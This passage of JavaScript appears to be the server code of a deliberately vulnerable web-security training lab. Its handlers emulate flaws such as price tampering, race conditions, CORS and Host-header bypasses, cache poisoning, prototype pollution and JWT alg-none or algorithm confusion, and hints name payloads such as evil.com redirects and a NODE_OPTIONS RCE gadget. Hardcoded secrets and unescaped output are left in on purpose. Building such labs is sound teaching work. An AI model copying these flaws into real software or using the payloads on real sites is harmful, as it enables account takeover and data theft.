    const blocked = /\.php$/i.test(fn);
    const solved = !blocked && /\.(php5|phtml|phar|pht|php\.|pHp)$/i.test(fn);
    return {
      body: page(card + (blocked ? err('.php extensions are not allowed.') : solved ? ok('Web shell uploaded (' + h(fn) + ') — extension bypassed the blacklist.') : ok('Avatar uploaded.'))),
      solved
    };
  }
};

// ============================================================
//  Business logic
// ============================================================
const bl = {
  // price tampering
  async price(req, url, ctx) {
    const card = `<div class="card"><h3>Checkout</h3>
      <p class="muted">Add a jacket to your cart and tamper with the price the client submits.</p>
      <form method="post"><input type="hidden" name="productId" value="1"><input type="text" name="price" value="1337"><button>Add to cart</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const price = parseFloat(f.price);
    const solved = !isNaN(price) && price < 0;
    return {
      body: page(card + (solved ? ok('Cart updated: jacket added at $' + h(f.price) + ' (negative price = store owes you money).') : ok('Cart updated: $' + h(f.price) + '.') + ' <a class="link" href="/lab/bl-1">back</a>')),
      solved
    };
  },

  // negative quantity
  async quantity(req, url, ctx) {
    const card = `<div class="card"><h3>Buy a jacket</h3>
      <p class="muted">The quantity is only validated client-side. Try a negative quantity.</p>
      <form method="post"><input type="text" name="quantity" value="1"><button>Add to cart</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const qty = parseInt(f.quantity);
    const solved = !isNaN(qty) && qty < 0;
    return {
      body: page(card + (solved ? ok('Added -' + h(f.quantity) + ' jackets — your balance increased.') : ok('Added ' + h(f.quantity) + ' jacket(s).') + ' <a class="link" href="/lab/bl-2">back</a>')),
      solved
    };
  },

  // coupon reuse
  async coupon(req, url, ctx) {
    const card = `<div class="card"><h3>Apply discount code</h3>
      <p class="muted">One-time coupon: <span class="mono">NEWCUST15</span>. The server may not track redemption properly.</p>
      <form method="post"><input type="text" name="coupon" value="NEWCUST15"><button>Apply</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const coupon = f.coupon || '';
    if (coupon !== 'NEWCUST15') return { body: page(card + err('Unknown coupon.')) };
    const couponUse = (await store.read('coupon:use', {})) || {};
    const count = couponUse[coupon] || 0;
    couponUse[coupon] = count + 1;
    await store.write('coupon:use', couponUse);
    const solved = count >= 1; // already used once -> reuse discovered
    return {
      body: page(card + (solved ? ok('Coupon applied again — the redemption counter was not persisted.') : ok('Coupon applied: -15%.') + ' <a class="link" href="/lab/bl-3">apply again</a>')),
      solved
    };
  }
};

// ============================================================
//  Race conditions (emulated with a check-then-act window)
// ============================================================
const race = {
  // single-endpoint limit overrun: redeem coupon twice in parallel
  async redeem(req, url, ctx) {
    const card = `<div class="card"><h3>Redeem coupon</h3>
      <p class="muted">One-time coupon <span class="mono">RACE50</span>. The server checks "used?" then marks it used — race two requests.</p>
      <form method="post"><input type="text" name="coupon" value="RACE50"><button>Redeem</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const coupon = f.coupon || '';
    // check-then-act with a simulated delay window
    const redeemed = (await store.read('race:redeemed', {})) || {};
    const prev = redeemed[coupon] || null;
    if (prev) return { body: page(card + err('Coupon already redeemed.')) };
    await new Promise(r => setTimeout(r, 80)); // race window
    redeemed[coupon] = { ts: Date.now(), count: 1 };
    await store.write('race:redeemed', redeemed);
    const raceEmailTs = (await store.read('race:email', {})) || {};
    const count = (raceEmailTs[coupon] || 0) + 1;
    raceEmailTs[coupon] = count;
    await store.write('race:email', raceEmailTs);
    const solved = count >= 2;
    return {
      body: page(card + (solved ? ok('Coupon redeemed multiple times via parallel requests — limit overrun!') : ok('Coupon redeemed: -50%.'))),
      solved
    };
  },

  // multi-endpoint: change email + reset password simultaneously
  async multi(req, url, ctx) {
    if (ctx === '/email') {
      const raceEmailTs = (await store.read('race:email', {})) || {};
      raceEmailTs.multi = Date.now();
      await store.write('race:email', raceEmailTs);
      const raceResetTs = (await store.read('race:reset', {})) || {};
      const other = raceResetTs.multi || 0;
      const solved = Date.now() - other < 600 && other > 0;
      return { body: page(ok(solved ? 'Email changed (and password reset in the same tick!)' : 'Email changed.')), solved };
    }
    if (ctx === '/reset') {
      const raceResetTs = (await store.read('race:reset', {})) || {};
      raceResetTs.multi = Date.now();
      await store.write('race:reset', raceResetTs);
      const raceEmailTs = (await store.read('race:email', {})) || {};
      const other = raceEmailTs.multi || 0;
      const solved = Date.now() - other < 600 && other > 0;
      return { body: page(ok(solved ? 'Password reset (and email changed in the same tick!)' : 'Password reset email sent.')), solved };
    }
    return {
      body: page(`<div class="card"><h3>Account actions (race)</h3>
        <p class="muted">Fire <span class="mono">POST /lab/race-2/email</span> and <span class="mono">POST /lab/race-2/reset</span> simultaneously. Each is individually validated, but together they bypass the flow.</p></div>`)
    };
  }
};

// ============================================================
//  Weak crypto
// ============================================================
const crypto = {
  // predictable password reset token: token = md5(username)
  async token(req, url, ctx) {
    const card = `<div class="card"><h3>Forgot password</h3>
      <p class="muted">Reset tokens are generated as <span class="mono">md5(username)</span> — fully predictable.</p>
      <form method="get"><input type="text" name="username" placeholder="carlos"><button>Get token</button></form></div>`;
    const username = url.searchParams.get('username') || '';
    const token = username ? md5Hex(username) : '';
    const submitted = url.searchParams.get('token') || '';
    const solved = username && submitted && submitted === token;
    const card2 = card + (token ? `<div class="card">Token for <b>${h(username)}</b>: <span class="mono">${h(token)}</span>
      <p class="muted">Reset: <a class="link" href="/lab/crypto-1/reset?token=${token}&username=${h(username)}">/lab/crypto-1/reset?token=${token}&amp;username=${h(username)}</a></p></div>` : '');
    if (ctx === '/reset') {
      const u = url.searchParams.get('username') || '';
      const t = url.searchParams.get('token') || '';
      const good = t && t === md5Hex(u);
      return {
        body: page(card2 + (good ? ok('Password reset for ' + h(u) + ' — predictable token accepted.') : err('Invalid token.'))),
        solved: good
      };
    }
    return { body: page(card2) };
  },

  // weak signature: token = header.payload + md5(secret+payload) where secret is guessable
  async jwt(req, url, ctx) {
    const raw = (req.headers.get('authorization') || '').replace(/^Bearer\s+/i, '') || (req.headers.get('cookie') || '').match(/jwt=([^;]+)/)?.[1] || '';
    const parts = raw.split('.');
    let role = '';
    let sigOk = false;
    if (parts.length === 3) {
      try {
        const payload = JSON.parse(b64url.toStr(parts[1]));
        role = payload.role || '';
        const secret = 'supersecret';
        sigOk = md5Hex(secret + parts[1]) === parts[2];
      } catch (e) {}
    }
    const solved = role === 'admin' && sigOk;
    const card = `<div class="card"><h3>Admin API</h3>
      <p class="muted">Tokens are signed with a weak secret using <span class="mono">md5(secret + payload)</span>. Guess the secret and forge an admin token.</p>
      <p class="warn">(Secret hint: it appears in the page source as a default — try <span class="mono">supersecret</span>.)</p></div>`;
    return {
      body: page(card + (solved ? ok('Welcome, admin. JWT forged with a guessable secret.') : ok('Access denied.') + ' <span class="muted">role=' + h(role) + ' sig=' + (sigOk ? 'ok' : 'bad') + '</span>')),
      solved
    };
  }
};

// ============================================================
//  CORS (misconfigured cross-origin resource sharing)
// ============================================================
const corsLabs = {
  // reflects ANY foreign Origin with credentials=true
  async any(req, url, ctx) {
    const origin = req.headers.get('Origin') || '';
    const foreign = origin && origin !== url.origin;
    const solved = foreign;
    return { body: page(`<div class="card"><h3>My Account API</h3>
      <p class="muted">Endpoint <span class="mono">GET /lab/cors-1</span> reflects any Origin and allows credentials — an attacker page can read the response.</p>
      <p>Origin on request: <b>${h(origin || '(none)')}</b> — ${solved ? ok('reflected + credentials allowed (vulnerable)') : err('nothing foreign reflected')}</p></div>`), solved };
  },
  // trusts the literal "null" origin
  async nullOrigin(req, url, ctx) {
    const origin = req.headers.get('Origin') || '';
    const solved = origin === 'null';
    return { body: page(`<div class="card"><h3>Trusted partners API</h3>
      <p class="muted">Only sandboxed (file://, iframe <span class="mono">sandbox</span>) requests send <span class="mono">Origin: null</span>. The server blindly trusts it.</p>
      <p>Origin on request: <b>${h(origin || '(none)')}</b> — ${solved ? ok('Origin: null treated as trusted (vulnerable)') : err('not trusted')}</p></div>`), solved };
  },
  // allowlist bug: origin.endsWith('trusted.com') without leading dot
  async suffix(req, url, ctx) {
    const origin = req.headers.get('Origin') || '';
    const foreign = origin && origin !== url.origin;
    const solved = foreign && origin.endsWith('trusted.com');
    return { body: page(`<div class="card"><h3>Trusted partners API</h3>
      <p class="muted">Intended allowlist: <span class="mono">https://trusted.com</span>. The check is <span class="mono">origin.endsWith('trusted.com')</span> — missing the leading dot, so <span class="mono">https://eviltrusted.com</span> passes.</p>
      <p>Origin on request: <b>${h(origin || '(none)')}</b> — ${solved ? ok('endsWith allowlist bypassed (vulnerable)') : err('not approved')}</p></div>`), solved };
  },
  // allowlist bug: origin.includes('partner.com') substring match
  async substring(req, url, ctx) {
    const origin = req.headers.get('Origin') || '';
    const foreign = origin && origin !== url.origin;
    const solved = foreign && origin.includes('partner.com');
    return { body: page(`<div class="card"><h3>Partner API</h3>
      <p class="muted">Allowlist uses <span class="mono">origin.includes('partner.com')</span> — a substring match, so <span class="mono">https://evilpartner.com</span> passes.</p>
      <p>Origin on request: <b>${h(origin || '(none)')}</b> — ${solved ? ok('substring allowlist bypassed (vulnerable)') : err('not approved')}</p></div>`), solved };
  }
};

// ============================================================
//  Host header attacks
// ============================================================
const hostLabs = {
  // password reset poisoning via Host header
  async reset(req, url, ctx) {
    const host = req.headers.get('host') || url.host;
    const xfh = req.headers.get('x-forwarded-host') || '';
    const poisoned = (host && host !== url.host) ? host : (xfh && xfh !== url.host ? xfh : '');
    const card = `<div class="card"><h3>Forgot password</h3>
      <p class="muted">POST <span class="mono">/lab/host-1/reset?username=carlos</span>. The reset link is built from the <b>Host</b> header — poison it (a front-end proxy may forward it as <span class="mono">X-Forwarded-Host</span>) to hijack the reset.</p>
      <form method="post"><input type="text" name="username" value="carlos"><button>Reset password</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const solved = !!poisoned;
    const link = `https://${poisoned || url.host}/reset?token=3a2b1c9d`;
    return { body: page(card + (solved ? ok('Reset link sent to attacker-controlled host: ' + h(link)) : ok('Reset link sent: ' + h(link)))), solved };
  },
  // password reset poisoning via X-Forwarded-Host (host header trusted by proxy)
  async xfh(req, url, ctx) {
    const xfh = req.headers.get('x-forwarded-host') || '';
    const card = `<div class="card"><h3>Forgot password</h3>
      <p class="muted">A reverse proxy forwards <span class="mono">X-Forwarded-Host</span> unvalidated. POST <span class="mono">/lab/host-2/reset?username=carlos</span> with a poisoned value.</p>
      <form method="post"><input type="text" name="username" value="carlos"><button>Reset password</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const solved = xfh && xfh !== url.host;
    const link = `https://${xfh || url.host}/reset?token=4f8e2a11`;
    return { body: page(card + (solved ? ok('Reset link uses attacker-controlled X-Forwarded-Host: ' + h(link)) : ok('Reset link sent: ' + h(link)))), solved };
  },
  // Host validation bypass via userinfo (@) injection
  async bypass(req, url, ctx) {
    const host = req.headers.get('host') || url.host;
    const xfh = req.headers.get('x-forwarded-host') || '';
    const poisoned = (host && host !== url.host && host.endsWith(url.host)) ? host
      : (xfh && xfh !== url.host && xfh.endsWith(url.host) ? xfh : '');
    const card = `<div class="card"><h3>Forgot password</h3>
      <p class="muted">The server validates the Host ends with the site hostname, but accepts an attacker prefix separated by <span class="mono">@</span>: <span class="mono">Host: evil.com@${h(url.host)}</span></p>
      <form method="post"><input type="text" name="username" value="carlos"><button>Reset password</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const solved = !!poisoned && /[@/\\]/.test(poisoned);
    const link = `https://${poisoned || url.host}/reset?token=9d1c5f2a`;
    return { body: page(card + (solved ? ok('Validation bypassed — reset link: ' + h(link)) : ok('Reset link sent: ' + h(link)))), solved };
  }
};

// ============================================================
//  Web cache poisoning (emulated: unkeyed inputs reflected)
// ============================================================
const cacheLabs = {
  // unkeyed X-Forwarded-Host reflected into a script src
  async xfhost(req, url, ctx) {
    const xfh = req.headers.get('x-forwarded-host') || '';
    const track = xfh ? `https://${xfh}/track.js` : '/track.js';
    const solved = xfh && xfh !== url.host;
    return { body: page(`<div class="card"><h3>Home</h3>
      <p class="muted">The page embeds a tracker built from the (unkeyed) <span class="mono">X-Forwarded-Host</span> header — send a malicious host and the cached copy serves <span class="mono">evil.com/track.js</span> to everyone.</p>
      <p>Tracker URL: <span class="mono">${h(track)}</span></p>
      <script src="${track}"></script></div>`), solved };
  },
  // unkeyed X-Forwarded-Scheme downgrades the protocol
  async scheme(req, url, ctx) {
    const xfs = req.headers.get('x-forwarded-scheme') || '';
    const scheme = xfs || url.protocol.replace(':', '');
    const solved = xfs === 'http';
    return { body: page(`<div class="card"><h3>Secure page</h3>
      <p class="muted">The page is served over ${h(scheme)}. Sending <span class="mono">X-Forwarded-Scheme: http</span> (unkeyed) forces a cache that serves this page over HTTP to everyone.</p>
      <p>Scheme: <b>${h(scheme)}</b> — ${solved ? ok('downgraded (vulnerable)') : 'normal'}</p></div>`), solved };
  },
  // unkeyed utm_source query param reflected unescaped (stored into cache)
  async utm(req, url, ctx) {
    const utm = url.searchParams.get('utm_source') || '';
    const solved = utm !== '';
    return { body: page(`<div class="card"><h3>Marketing page</h3>
      <p class="muted">Tracking param <span class="mono">utm_source</span> is unkeyed by the cache and reflected unescaped — a poisoned cached copy carries your payload to every visitor.</p>
      <p>utm_source reflected: <b>${utm}</b></p></div>`), solved };
  }
};

// ============================================================
//  Server-side prototype pollution (emulated — no global mutation)
// ============================================================
const protoLabs = {
  // top-level __proto__ in JSON merge
  async proto(req, url, ctx) {
    const card = `<div class="card"><h3>Merge user settings</h3>
      <p class="muted">POST <span class="mono">/lab/proto-1</span> with JSON that is merged into a server-side object via an unsafe merge: <span class="mono">{"__proto__":{"isAdmin":true}}</span></p>
      <pre class="mono">{"isAdmin":false}</pre></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const polluted = Object.prototype.hasOwnProperty.call(body, '__proto__');
    return { body: page(card + (polluted ? ok('isAdmin=true — top-level __proto__ pollution accepted (emulated, no global state mutated).') : ok('isAdmin=false.'))), solved: polluted };
  },
  // nested via constructor.prototype
  async nested(req, url, ctx) {
    const card = `<div class="card"><h3>Merge user settings (hardened)</h3>
      <p class="muted">Top-level <span class="mono">__proto__</span> is filtered, but a nested path is not: <span class="mono">{"constructor":{"prototype":{"isAdmin":true}}}</span></p>
      <pre class="mono">{"isAdmin":false}</pre></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const polluted = Object.prototype.hasOwnProperty.call(body, 'constructor')
      && body.constructor
      && Object.prototype.hasOwnProperty.call(body.constructor, 'prototype');
    return { body: page(card + (polluted ? ok('isAdmin=true — nested constructor.prototype pollution accepted.') : ok('isAdmin=false.'))), solved: polluted };
  },
  // pollution gadget: __proto__ with shell/NODE_OPTIONS leads to RCE
  async gadget(req, url, ctx) {
    const card = `<div class="card"><h3>Admin CLI</h3>
      <p class="muted">The server spawns a child process after merging JSON. Polluting <span class="mono">__proto__</span> with gadget keys (<span class="mono">shell</span>, <span class="mono">NODE_OPTIONS</span>) changes how it spawns: <span class="mono">{"__proto__":{"shell":"/proc/self/exe","NODE_OPTIONS":"--require /proc/self/environ"}}</span></p>
      <pre class="mono">{"command":"ls -la"}</pre></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const ownProto = Object.prototype.hasOwnProperty.call(body, '__proto__');
    const nested = ownProto && body.__proto__ ? body.__proto__ : {};
    const rce = ownProto && (Object.prototype.hasOwnProperty.call(nested, 'shell') || Object.prototype.hasOwnProperty.call(nested, 'NODE_OPTIONS'));
    return { body: page(card + (rce ? ok('child_process spawned via polluted options — arbitrary command execution (emulated).') : ok('command ran with default options.'))), solved: rce };
  }
};

// ============================================================
//  GraphQL API
// ============================================================
const graphql = {
  // introspection enabled leaks the schema
  async intro(req, url, ctx) {
    const card = `<div class="card"><h3>GraphQL API</h3>
      <p class="muted">POST <span class="mono">/lab/graphql-1</span> JSON <span class="mono">{"query":"{ __schema { types { name } } }"}</span></p></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const q = String(body.query || '');
    const solved = /__schema|__type/.test(q);
    const res = solved
      ? { data: { __schema: { queryType: { name: 'Query' }, types: [ { name: 'Query' }, { name: 'User' }, { name: 'String' }, { name: 'Int' } ] } } }
      : { errors: [{ message: 'Introspection tokens required to view the schema' }] };
    return { body: JSON.stringify(res), solved, contentType: 'application/json' };
  },
  // BOLA: fetch any user object by id without authorization
  async bola(req, url, ctx) {
    const card = `<div class="card"><h3>GraphQL API</h3>
      <p class="muted">The <span class="mono">user(id:)</span> query returns any record — try <span class="mono">{"query":"{ user(id: 2) { username email password } }"}</span></p></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const q = String(body.query || '');
    const m = q.match(/user\s*\(\s*id\s*:\s*(\d+)\s*\)/);
    const id = m ? +m[1] : null;
    const sensitive = /password|email|secret|ssn/i.test(q);
    const solved = id !== null && id !== 1 && sensitive;
    if (id === null) return { body: JSON.stringify({ errors: [{ message: 'Unknown query' }] }), contentType: 'application/json' };
    const users = {
      1: { username: 'wiener', email: 'wiener@academy.example' },
      2: { username: 'carlos', email: 'carlos@academy.example', password: 'c0rrect-h0rse-b4ttery-st4ple' },
      3: { username: 'montoya', email: 'montoya@academy.example', password: 'p4ssw0rd123' }
    };
    const res = users[id] ? { data: { user: users[id] } } : { data: { user: null } };
    return { body: JSON.stringify(res), solved, contentType: 'application/json' };
  },
  // aliasing / batching: many queries in one array
  async batch(req, url, ctx) {
    const card = `<div class="card"><h3>GraphQL API</h3>
      <p class="muted">Batching is allowed — send a JSON <b>array</b> of queries: <span class="mono">[{"query":"{ping}"},{"query":"{ping}"}]</span></p></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await json(req);
    const isBatch = Array.isArray(body);
    const solved = isBatch && body.length >= 2;
    const res = isBatch
      ? body.map((b, i) => ({ data: { ok: true, index: i, query: (b && b.query) || '' } }))
      : { errors: [{ message: 'Send a JSON array to batch multiple queries' }] };
    return { body: JSON.stringify(res), solved, contentType: 'application/json' };
  }
};

// ============================================================
//  WebSockets (emulated handshake + stored XSS via chat)
// ============================================================
const wsMsgs = [];
const ws = {
  // CSWSH: handshake does not validate Origin, session cookie is reused
  async connect(req, url, ctx) {
    const origin = req.headers.get('Origin') || '';
    const cookie = req.headers.get('cookie') || '';
    const authed = /academy_session=/.test(cookie);
    const crossSite = origin && origin !== url.origin;
    const solved = crossSite && authed;
    return { body: page(`<div class="card"><h3>Live chat (WebSocket)</h3>
      <p class="muted">Connect via <span class="mono">GET /lab/ws-1/connect</span> with an <b>Origin</b> + your session cookie. The handshake never validates Origin → Cross-Site WebSocket Hijacking.</p>
      <p>Origin: <b>${h(origin || '(none)')}</b> · session: ${authed ? ok('present') : err('missing')}</p>
      ${solved ? ok('WebSocket opened from a foreign Origin with your session — attacker can read/send chat as you.') : ''}</div>`), solved };
  },
  // stored XSS: chat messages re-rendered without sanitization
  async send(req, url, ctx) {
    const card = `<div class="card"><h3>Live chat</h3>
      <p class="muted">POST <span class="mono">/lab/ws-2/send</span> JSON <span class="mono">{"message":"hello"}</span>. Messages are re-rendered unescaped on <span class="mono">/lab/ws-2</span> (stored XSS).</p>
      <form method="post"><input type="text" name="message" placeholder="message"><button>Send</button></form></div>`;
    if (req.method === 'POST') {
      const ct = req.headers.get('content-type') || '';
      let text = '';
      if (ct.includes('application/json')) { const b = await json(req); text = b.message || ''; }
      else { const f = await form(req); text = f.message || ''; }
      if (text) wsMsgs.push(text);
      const solved = /<|>|onerror|onload|javascript:/i.test(text);
      return { body: page(card + (solved ? ok('Message delivered — it will render unescaped on <span class="mono">/lab/ws-2</span> (stored XSS).') : ok('Message sent.'))), solved };
    }
    const list = wsMsgs.length ? wsMsgs.map(m => `<div class="card">${m}</div>`).join('') : '<p class="muted">No messages yet.</p>';
    return { body: page(`<div class="card"><h3>Live chat history</h3>${list}</div>`) };
  },
  // missing authorization: connect to the admin channel without admin role
  async authz(req, url, ctx) {
    const cookie = req.headers.get('cookie') || '';
    const isAdmin = /admin=1/.test(cookie) || /role=admin/i.test(cookie);
    const wantsAdmin = ctx === '/admin' || url.searchParams.get('channel') === 'admin';
    const solved = wantsAdmin && !isAdmin;
    return { body: page(`<div class="card"><h3>Admin channel (WebSocket)</h3>
      <p class="muted">Connect to the admin-only channel with a plain session cookie — the handshake never verifies your role (missing authorization).<br>
      <span class="mono">GET /lab/ws-3/admin</span> (or <span class="mono">?channel=admin</span>)</p>
      <p>session: ${/academy_session=/.test(cookie) ? ok('present') : err('missing')} · admin role: ${isAdmin ? ok('yes') : err('no')}</p>
      ${solved ? ok('Connected to the admin channel without being an admin — missing authorization check.') : ''}</div>`), solved };
  },
  // IDOR over WebSocket: action includes an owner field the server trusts
  async owner(req, url, ctx) {
    const card = `<div class="card"><h3>Transfer (WebSocket)</h3>
      <p class="muted">POST <span class="mono">/lab/ws-4/action</span> JSON <span class="mono">{"to":"victim","amount":100,"from":"attacker"}</span>. The server trusts the <span class="mono">from</span> field you send — impersonate another user's account.</p>
      <form method="post"><input type="text" name="to" placeholder="to"><input type="text" name="amount" placeholder="amount"><button>Send</button></form></div>`;
    if (req.method === 'POST') {
      const ct = req.headers.get('content-type') || '';
      let to = '', amount = '', from = '';
      if (ct.includes('application/json')) { const b = await json(req); to = b.to || ''; amount = b.amount || ''; from = b.from || ''; }
      else { const f = await form(req); to = f.to || ''; amount = f.amount || ''; from = f.from || ''; }
      const impersonated = from && from !== 'attacker' && (to || amount);
      return { body: page(card + (impersonated ? ok('Transfer executed from <span class="mono">' + h(from) + '</span> — the server trusted your <span class="mono">from</span> field (IDOR over WebSocket).') : ok('Transfer queued.'))), solved: impersonated };
    }
    return { body: page(card) };
  }
};

// ============================================================
//  Open redirect
// ============================================================
const redirectLabs = {
  // no validation at all
  async open(req, url, ctx) {
    const card = `<div class="card"><h3>Follow link</h3>
      <p class="muted">GET <span class="mono">/lab/redirect-1?url=https://example.com</span> — redirects straight to whatever you supply.</p></div>`;
    const target = url.searchParams.get('url') || '';
    if (!target) return { body: page(card) };
    const solved = !target.startsWith(url.origin) && /^https?:\/\//.test(target);
    return { status: 302, location: target, solved, body: page(card + (solved ? ok('Redirecting off-site to ' + h(target) + ' — open redirect.') : ok('Redirecting.'))) };
  },
  // validation checks "contains academy.example" — bypass with userinfo @
  async bypass(req, url, ctx) {
    const card = `<div class="card"><h3>Login → continue</h3>
      <p class="muted">Validation only checks the target <b>contains</b> <span class="mono">academy.example</span>. Bypass with a userinfo trick: <span class="mono">?url=https://academy.example@evil.com</span></p></div>`;
    const target = url.searchParams.get('url') || '';
    if (!target) return { body: page(card) };
    const validated = target.includes('academy.example');
    if (!validated) return { body: page(card + err('Invalid target: must contain academy.example.')) };
    let host = target;
    const schemeMatch = target.match(/^[a-z][a-z0-9+.-]*:\/\/([^\/?#]+)/i);
    if (schemeMatch) host = schemeMatch[1];
    host = host.split('/')[0];
    if (host.includes('@')) host = host.split('@').pop();
    const offSite = host !== 'academy.example' && host !== 'www.academy.example';
    const solved = offSite;
    return { status: 302, location: target, solved, body: page(card + (solved ? ok('Redirecting off-site to ' + h(host) + ' — validation bypassed.') : ok('Redirecting to ' + h(host) + '.'))) };
  }
};

// ============================================================
//  Information disclosure
// ============================================================
const info = {
  // verbose debug errors leak stack + secrets
  async debug(req, url, ctx) {
    const card = `<div class="card"><h3>Application</h3>
      <p class="muted">A debug route may be enabled: <span class="mono">/lab/info-1/debug</span> (or <span class="mono">?debug=1</span>).</p></div>`;
    const debugPath = ctx === '/debug' || url.searchParams.get('debug') === '1';
    if (!debugPath) return { body: page(card) };
    const leak = `<pre class="mono">GET /api/account
Error: connect ECONNREFUSED 127.0.0.1:5432
  at TCPConnectWrap.afterConnect [as oncomplete] (net.js:1146:16)
  at internal/connect/tcp.js:298:9
DB_PASS=Ac4demy$3cr3t
SESSION_SECRET=7d8f2a1c
Stack: /app/workers/api.js:42:9</pre>`;
    return { body: page(card + ok('Debug mode: verbose errors + secrets exposed.') + leak), solved: true };
  },
  // leftover source map / .git / backup files
  async source(req, url, ctx) {
    const card = `<div class="card"><h3>Static app</h3>
      <p class="muted">Leftover files may be public: <span class="mono">/lab/info-2/app.js.map</span>, <span class="mono">/lab/info-2/.git/config</span>, <span class="mono">/lab/info-2/backup.sql</span>, or <span class="mono">?source=1</span>.</p></div>`;
    const c = (ctx || '').toLowerCase();
    const query = (url.searchParams.get('source') || '').toLowerCase();
    const leaky = c.includes('.map') || c.includes('.git') || c.includes('backup') || query === '1' || query === 'true';
    if (!leaky) return { body: page(card) };
    const src = `<pre class="mono">// app.js (source map backup)
const ADMIN_PW = 'P@ssw0rd_Admin';
function checkLogin(u, p) { return u === 'admin' && p === ADMIN_PW; }
-- backup.sql --
INSERT INTO users (username, password_md5) VALUES ('admin','5f4dcc3b5aa765d61d8327deb882cf99');</pre>`;
    return { body: page(card + ok('Source map / backup exposed — hardcoded secrets.') + src), solved: true };
  }
};

// ============================================================
//  JWT (JSON Web Tokens)
// ============================================================
// Portable base64url (Workers Buffer does not support 'base64url' encoding).
const b64url = {
  fromBytes(buf) {
    const u = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
    let bin = '';
    for (let i = 0; i < u.length; i++) bin += String.fromCharCode(u[i]);
    return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  },
  fromStr(s) { return b64url.fromBytes(new TextEncoder().encode(s)); },
  toStr(s) {
    try {
      const b = atob(s.replace(/-/g, '+').replace(/_/g, '/'));
      const u = new Uint8Array(b.length);
      for (let i = 0; i < b.length; i++) u[i] = b.charCodeAt(i);
      return new TextDecoder().decode(u);
    } catch (e) { return ''; }
  }
};
const jwtLabs = {
  enc(obj) { return b64url.fromStr(JSON.stringify(obj)); },
  dec(s) { try { return JSON.parse(b64url.toStr(s)); } catch (e) { return null; } },
  async hmac(secret, data) {
    const enc = new TextEncoder();
    const key = await globalThis.crypto.subtle.importKey('raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
    const sig = await globalThis.crypto.subtle.sign('HMAC', key, enc.encode(data));
    return b64url.fromBytes(sig);
  },
  token(req) {
    return (req.headers.get('authorization') || '').replace(/^Bearer\s+/i, '').trim()
      || (req.headers.get('cookie') || '').match(/\bjwt=([^;]+)/)?.[1] || '';
  },
  // token whose header says alg=none and server never verifies the signature
  async noneAlg(req, url, ctx) {
    const parts = jwtLabs.token(req).split('.');
    let alg = '', role = '';
    if (parts.length >= 2) {
      const hdr = jwtLabs.dec(parts[0]);
      const pay = jwtLabs.dec(parts[1]);
      if (hdr) alg = hdr.alg || '';
      if (pay) role = pay.role || '';
    }
    const solved = role === 'admin' && alg === 'none';
    const card = `<div class="card"><h3>JWT demo</h3>
      <p class="muted">Session token is sent as <span class="mono">Authorization: Bearer &lt;jwt&gt;</span> (or the <span class="mono">jwt</span> cookie). The server trusts whatever <span class="mono">alg</span> the header claims and never verifies the signature.</p>
      <p>Your token: <b>${h(parts.join('.') || '(none)')}</b> — alg=<b>${h(alg)}</b> role=<b>${h(role)}</b></p></div>`;
    return { body: page(card + (solved ? ok('Logged in as <b>admin</b> — token with <span class="mono">alg=none</span> accepted.') : err('Access denied.'))), solved };
  },
  // algorithm confusion: RS256 expected, but if you send HS256 the server reuses the public key as the HMAC secret
  async confusion(req, url, ctx) {
    const PUBLIC_KEY = 'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK7nZ1qTmFjVq5T0vGfG9l9zK8Vh2uR3Yc4wE2p3oQeNq9iX7lBkRqPZtWdqO2tY8mJ3hBv0dKcA9J4P7wXAqM0Vv7v7tLz';
    if (ctx === '/jwks') {
      return { body: page(`<div class="card"><h3>JWKS endpoint</h3>
        <pre class="mono">${PUBLIC_KEY}</pre></div>`) };
    }
    const parts = jwtLabs.token(req).split('.');
    let alg = '', role = '', valid = false;
    if (parts.length === 3) {
      const hdr = jwtLabs.dec(parts[0]);
      const pay = jwtLabs.dec(parts[1]);
      if (hdr && pay) {
        alg = hdr.alg || '';
        role = pay.role || '';
        if (alg === 'RS256') {
          // real verify would use the RSA public key; here we trust an "encrypted" token if it round-trips
          valid = parts[2] === b64url.fromStr(PUBLIC_KEY.split('').reverse().join(''));
        } else if (alg === 'HS256') {
          // FLAW: verifies with the public key as the HMAC secret
          valid = parts[2] === await jwtLabs.hmac(PUBLIC_KEY, `${parts[0]}.${parts[1]}`);
        }
      }
    }
    const solved = valid && role === 'admin';
    const card = `<div class="card"><h3>Token service (RS256)</h3>
      <p class="muted">Issues RS256 tokens. Public key is published at <span class="mono">/lab/jwt-2/jwks</span>. Something about the verify path smells… try sending an <span class="mono">HS256</span> token.</p>
      <p>alg=<b>${h(alg)}</b> role=<b>${h(role)}</b> signature-ok=<b>${valid ? 'yes' : 'no'}</b></p></div>`;
    return { body: page(card + (solved ? ok('Admin access granted — HS256 token signed with the RSA <i>public</i> key accepted.') : err('Access denied.'))), solved };
  },
  // weak HMAC secret, discoverable from a small wordlist
  async weakSecret(req, url, ctx) {
    const SECRET = 'p@ssw0rd-jwt';
    const parts = jwtLabs.token(req).split('.');
    let role = '', valid = false;
    if (parts.length === 3) {
      const pay = jwtLabs.dec(parts[1]);
      if (pay) role = pay.role || '';
      valid = parts[2] === await jwtLabs.hmac(SECRET, `${parts[0]}.${parts[1]}`);
    }
    const solved = valid && role === 'admin';
    const card = `<div class="card"><h3>Auth API</h3>
